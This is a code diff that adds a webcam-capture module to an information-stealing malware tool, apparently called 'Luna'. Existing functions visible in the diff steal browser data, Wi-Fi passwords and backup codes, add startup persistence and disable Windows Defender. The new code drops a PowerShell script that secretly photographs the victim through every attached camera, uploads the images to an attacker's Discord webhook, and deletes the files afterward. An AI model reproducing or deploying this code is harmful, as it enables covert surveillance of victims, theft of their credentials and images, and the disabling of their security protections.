@@ -9,7 +9,7 @@ import subprocess
 import sys
 import threading
 import time
-from shutil import copy2
+from shutil import copy2, move
 from zipfile import ZIP_DEFLATED, ZipFile
 
 import psutil
@@ -49,7 +49,7 @@ localappdata = os.getenv("localappdata")
 
 
 def main(webhook: str):
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender, Webcam]
     configcheck(threads)
 
     for func in threads:
@@ -772,6 +772,226 @@ class Wifi:
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
         f.close()
 
+
+class Webcam:
+    def __init__(self) -> None:
+        self.webcam_list = []
+        self.webcam_grab()
+        
+    def webcam_grab(self) -> None:
+        powershell_code = r"""function Get-WebCamImage {
+    # made by https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1, he did 99% of the work the other 1% modified by KDot227
+    # had to half learn c# to figure anything out (I still don't understand it)
+    $source=@" 
+    using System; 
+    using System.Collections.Generic; 
+    using System.Text; 
+    using System.Collections; 
+    using System.Runtime.InteropServices; 
+    using System.ComponentModel; 
+    using System.Data; 
+    using System.Drawing; 
+    using System.Windows.Forms; 
+    
+    namespace WebCamLib 
+    { 
+        public class Device 
+        { 
+            private const short WM_CAP = 0x400; 
+            private const int WM_CAP_DRIVER_CONNECT = 0x40a; 
+            private const int WM_CAP_DRIVER_DISCONNECT = 0x40b; 
+            private const int WM_CAP_EDIT_COPY = 0x41e; 
+            private const int WM_CAP_SET_PREVIEW = 0x432; 
+            private const int WM_CAP_SET_OVERLAY = 0x433; 
+            private const int WM_CAP_SET_PREVIEWRATE = 0x434; 
+            private const int WM_CAP_SET_SCALE = 0x435; 
+            private const int WS_CHILD = 0x40000000; 
+            private const int WS_VISIBLE = 0x10000000; 
+    
+            [DllImport("avicap32.dll")] 
+            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
+                int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
+    
+            [DllImport("user32", EntryPoint = "SendMessageA")] 
+            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
+    
+            [DllImport("user32")] 
+            protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
+    
+            [DllImport("user32")] 
+            protected static extern bool DestroyWindow(int hwnd); 
+                    
+            int index; 
+            int deviceHandle; 
+    
+            public Device(int index) 
+            { 
+                this.index = index; 
+            } 
+    
+            private string _name; 
+    
+            public string Name 
+            { 
+                get { return _name; } 
+                set { _name = value; } 
+            } 
+    
+            private string _version; 
+    
+            public string Version 
+            { 
+                get { return _version; } 
+                set { _version = value; } 
+            } 
+    
+            public override string ToString() 
+            { 
+                return this.Name; 
+            } 
+    
+            public void Init(int windowHeight, int windowWidth, int handle) 
+            { 
+                string deviceIndex = Convert.ToString(this.index); 
+                deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0); 
+    
+                if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0) 
+                { 
+                    SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0); 
+                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0); 
+                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0); 
+                    SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6); 
+                } 
+            } 
+    
+            public void ShowWindow(global::System.Windows.Forms.Control windowsControl) 
+            { 
+                Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());                         
+            } 
+            
+            public void CopyC() 
+            { 
+                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
+            } 
+    
+            public void Stop() 
+            { 
+                SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0); 
+                DestroyWindow(deviceHandle); 
+            } 
+        } 
+        
+        public class DeviceManager 
+        { 
+            [DllImport("avicap32.dll")] 
+            protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
+                [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
+            int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
+    
+            static ArrayList devices = new ArrayList(); 
+    
+            public static Device[] GetAllDevices() 
+            { 
+                String dName = "".PadRight(100); 
+                String dVersion = "".PadRight(100); 
+    
+                for (short i = 0; i < 10; i++) 
+                { 
+                    if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100)) 
+                    { 
+                        Device d = new Device(i); 
+                        d.Name = dName.Trim(); 
+                        d.Version = dVersion.Trim(); 
+                        devices.Add(d);                     
+                    } 
+                } 
+    
+                return (Device[])devices.ToArray(typeof(Device)); 
+            } 
+			
+            public static Device GetDevice(int deviceIndex) 
+            { 
+                return (Device)devices[deviceIndex]; 
+            } 
+        } 
+    } 
+"@ 
+    Add-Type -AssemblyName System.Drawing  
+    $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
+    Where-Object { $_.FormatDescription -eq "JPEG" }       
+    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
+    try {
+        #region Import the Assemblies 
+        [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
+        [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
+        #endregion 
+        $picCapture = New-Object System.Windows.Forms.PictureBox 
+        try {
+            $devices = [WebCamLib.DeviceManager]::GetAllDevices()
+        } catch {
+            Write-Host "No camera found"
+            exit
+        }
+        $count = 0
+        foreach ($device in $devices) {
+            $imagePath = "$env:localappdata\temp\out$count.jpg"
+            $device.ShowWindow($picCapture)
+            $device.CopyC()
+            $bitmap = [Windows.Forms.Clipboard]::GetImage()
+            $bitmap.Save($imagePath, $jpegCodec, $ep)
+            $bitmap.dispose()
+            $count++
+            [Windows.Forms.Clipboard]::Clear()
+        }
+
+    } catch {
+            Write-Host "No camera found"
+            exit
+        }
+}
+
+Get-WebCamImage
+""" # Made by KDot227 ur welcome shmub ily
+        files_to_send = []
+        temp_path2 = os.getenv("temp")
+        with open(f"{temp_path2}\\webcam.ps1", "w") as f:
+            f.write(powershell_code)
+            
+        proc = subprocess.Popen(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", f"{temp_path2}\\webcam.ps1"])
+        proc.wait()
+        #find all files that look like out0, 1, 2, 3, etc.jpg
+        os.makedirs(os.path.join(temp_path2, "Webcam"), exist_ok=True)
+        for file in os.listdir(temp_path2):
+            if file.startswith("out") and file.endswith(".jpg"):
+                files_to_send.append(file)
+        for file in files_to_send:
+            self.send_file(f"{temp_path2}\\{file}")
+            os.remove(f"{temp_path2}\\{file}")
+        os.remove(f"{temp_path2}\\webcam.ps1")
+        
+    def send_file(self, file_path):
+        webhook = __CONFIG__.get("webhook")
+        
+        with open(file_path, "rb") as f:
+            file = f.read()
+        
+        webhook_data = {
+            "username": "Luna",
+            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+            "embeds": [
+                {
+                    "color": 5639644,
+                    "title": "Webcam Screenshot",
+                    "image": {
+                        "url": "attachment://image.png"
+                    }
+                }
+            ],
+        }
+        
+        encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', file, 'image/png')})
+
+        requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
 
 class Minecraft:
     def __init__(self):
